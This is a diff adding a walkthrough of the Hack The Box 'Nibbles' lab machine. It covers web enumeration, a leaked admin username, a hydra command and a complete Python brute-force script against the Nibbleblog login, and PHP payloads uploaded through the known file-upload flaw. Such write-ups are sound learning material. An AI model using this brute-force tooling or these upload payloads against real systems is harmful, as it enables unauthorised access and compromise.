@@ -320,16 +320,292 @@ Web fuzzing is applied to the leaked Web Path in the above source code using `go
 Note that this *Web Scan* is exported as evidence
 
 ```bash title="Nibbles/scans"
-gobuster dir --threads 100 --output ./webScan --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.129.96.84/nibbleblog
+gobuster dir --threads 75 --output ./webScan --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --extensions php --url http://10.129.96.84/nibbleblog/
 ```
 
 > [!NOTE]- *webScan*
 >
 > ```bash
+> /sitemap.php          (Status: 200) [Size: 402]
+> /content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
 > /themes               (Status: 301) [Size: 324] [--> http://10.129.96.84/nibbleblog/themes/]
+> /feed.php             (Status: 200) [Size: 302]
 > /admin                (Status: 301) [Size: 323] [--> http://10.129.96.84/nibbleblog/admin/]
+> /admin.php            (Status: 200) [Size: 1401]
 > /plugins              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/plugins/]
+> /install.php          (Status: 200) [Size: 78]
+> /update.php           (Status: 200) [Size: 1622]
 > /README               (Status: 200) [Size: 4628]
 > /languages            (Status: 301) [Size: 327] [--> http://10.129.96.84/nibbleblog/languages/]
-> /content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
+> /index.php            (Status: 200) [Size: 2987]
+> ```
 >
+
+From the resources reflected in the *Web Scan*, the `Content` directory and the `admin.php` files stand out from the rest
+
+The *Content Directory* resources can be listed (Directory listing) →
+
+![[NIBBLES-20241024155629942.webp|350]]
+> ***Zoom In***
+
+By searching the directory content, the following *XML* file is found in the `/content/private/users.xml` path
+
+![[NIBBLES-20241024160115055.webp|350]]
+> ***Zoom In***
+
+A username is leaked in the above file
+
+Remember to store all retrieved data and credentials
+
+```bash title="Nibbles/evidence/creds/"
+printf "%s\n" "admin" > ./users.txt
+```
+
+In the other hand, there is the `admin.php` resource which leads to a *Login Panel*
+
+![[NIBBLES-20241024160657723.webp|350]]
+> ***Zoom In***
+
+It seems the *CMS Login Panel*, the *Nibbleblog* one in this case
+
+Let's brute force this login panel using the `admin` user found above
+
+###### *Brute Force*
+
+In this case, before proceed with `Hydra` and the `Rockyou` dictionary, a custom dictorionary is created via `cewl`
+
+```bash title="Nibbles/tools"
+cewl -m 5 --with-numbers --depth 8 --write custom_dictionary.txt http://10.129.96.84/nibbleblog
+```
+
+Then, use `hydra` or a *Python Script* to brute force the *Admin Panel*
+
+First, intercept the *HTTP Request* attempting to log in to check the *HTTP Method*  and *Headers*
+
+![[NIBBLES-20241024171353125.webp|350]]
+> ***Zoom In***
+
+It is a *HTTP POST Request* with the following data
+
+- ***Username***
+- ***Password***
+
+The application displays an *Error Message* when the login is incorrect
+
+![[NIBBLES-20241024172641275.webp|350]]
+> ***Zoom In***
+
+According to this information, proceed as follows →
+
+- ***Hydra***
+
+```bash
+hydra -l admin -P ./dictionary.txt 10.129.130.179 http-post-form '/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password.'
+```
+
+- ***Python***
+
+```bash title="Nibbles/tools"
+python3 bruteforce.py http://10.129.96.84/nibbleblog/admin.php admin custom_dictionary.txt
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Login Incorrect (Password: Hello)
+> Login Incorrect (Password: world)
+> Login Successfull (Password: nibbles)
+> ```
+>
+
+> [!IMPORTANT]- *Bruteforce Script*
+>
+> ```python
+> #!/usr/bin/env python3
+> 
+> import signal
+> import os
+> import sys
+> import time
+> from colorama import Fore, Style
+> import argparse
+> import requests
+> 
+> def sigint_handler(sig, frame):
+> 
+>     print(Fore.MAGENTA + "\nSIGINT Signal sent to the process. Exiting..." + Style.RESET_ALL)
+> 
+>     signal.signal(signal.SIGINT, signal.SIG_DFL)
+> 
+>     os.kill(os.getpid(), signal.SIGINT)
+> 
+> class BruteForcer():
+> 
+>     def __init__(self, url, username, file):
+> 
+>         self.url = url
+>         self.username = username
+>         self.file = file
+>         self.session = requests.Session()
+> 
+>     def doLogin(self, username, password):
+> 
+>         data = {
+>             'username' : username,
+>             'password' : password
+>         }
+> 
+>         try:
+>             r = self.session.post(self.url, data=data)
+> 
+>             if r.ok:
+>                 if "Mr Nibbler is Cool!" in r.text:
+> 
+>                     return True
+>             else:
+>                 print(Fore.RED + f"Error -> Status Code: {r.status_code}" + Style.RESET_ALL)
+>                 sys.exit(1)
+> 
+>         except requests.ConnectionError as e:
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>         except requests.Timeout as e:
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>         except requests.RequestException as e:
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>         return False
+> 
+>     def bruteforce(self):
+> 
+>         try:
+>             with open(self.file, 'r') as f:
+> 
+>                 for password in f:
+> 
+>                     if self.doLogin(self.username, password.strip()):
+> 
+>                         print(Fore.GREEN + f"Login Successfull (Password: {Fore.MAGENTA}{password.strip()})" + Style.RESET_ALL)
+>                         break
+> 
+>                     else:
+>                         print(Fore.RED + f"Login Incorrect (Password: {password.strip()})" + Style.RESET_ALL)
+>                         time.sleep(1)
+> 
+>         except FileNotFoundError as e:
+>             print(Fore.RED + f"{e} not found in the system" + Style.RESET_ALL)
+>             sys.exit()
+> 
+>         except Exception as e:
+>             print(Fore.RED + f"Error trying to Open the file: {e}" + Style.RESET_ALL)
+>             sys.exit()
+> 
+> if __name__ == '__main__':
+> 
+>     signal.signal(signal.SIGINT, sigint_handler)
+> 
+>     parser = argparse.ArgumentParser(description='Script to bruteforce an Admin Panel Form')
+> 
+>     parser.add_argument('url', action='store', help='Admin Panel URL to bruteforce')
+>     parser.add_argument('username', action='store', help='Username to log in')
+>     parser.add_argument('dictionary', action='store', help='Password dictionary')
+> 
+>     args = parser.parse_args()
+> 
+>     bruteforcer = BruteForcer(args.url, args.username, args.dictionary)
+> 
+>     bruteforcer.bruteforce()
+> ```
+>
+
+***Credentials → admin:nibbles***
+
+#### Exploitation
+
+Once inside de *Admin Panel*, all functionalities must be inspected
+
+There is a *File Upload* in the ***my_image*** plugin form
+
+![[NIBBLES-20241024204840002.webp|350]]
+> ***Zoom In***
+
+The *Software Version* is also found →
+
+![[NIBBLES-20241024205345105.webp|300]]
+> ***Zoom In***
+
+***Version → 4.0.3***
+
+If a search about the existing vulnerabilities for this **Software** and **Version** is performed →
+
+```bash
+searchsploit nibble
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Nibbleblog 3 - Multiple SQL Injections               
+> Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)
+> ```
+>
+
+There is an ***Arbitrary File Upload*** vulnerability for the above version in the *my_image* plugin
+
+> ***[Reference](https://www.exploit-db.com/exploits/38489)***
+
+The following *PHP* payload is uploaded to check this functionality
+
+```php title="Nibbles/tools"
+<?php phpinfo(); ?>
+```
+
+![[NIBBLES-20241024210537513.webp|350]]
+> ***Zoom In***
+
+The referenced exploit shows the storage path of the uploaded files 
+
+***Storage Path → `http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php`***
+
+If accessed, the above resouce displays the following →
+
+![[NIBBLES-20241024210920873.webp|350]]
+> ***Zoom In***
+
+Therefore, this *Software Version* has been exploited via an *Arbitrary File Upload*
+
+Thank to the uploaded *PHPINFO()*, It is possible to check the *disable_functions* parameter value
+
+The same can be achieved uploading the following payload which checks what *PHP Dangerous Functions* are not disabled
+
+> [!IMPORTANT]- *PHP Payload*
+>
+> ```php
+> <?php
+> function getEnabledFunctions () {
+>     
+>     $commandFunctions = [
+>         'pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled',
+>         'pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler',
+>         'pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait',
+>         'pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec',
+>         'popen','proc_open','passthru','link','symlink','syslog','ld','mail'
+>     ];
+> 
+>     $disabledFunctions = array_map('trim', explode(',', ini_get('disable_functions')));
+>     $enabledFunctions = array_diff($commandFunctions, $disabledFunctions);
+> 
+>     if (!empty($enabledFunctions)) {
+>         foreach ($enabledFunctions as $function) {
+>             echo "Function enabled ->" . $function . "<br>";
+>         }
+>     }
+> }
+>
+> getEnabledFunctions();
+> ?>
+> ```
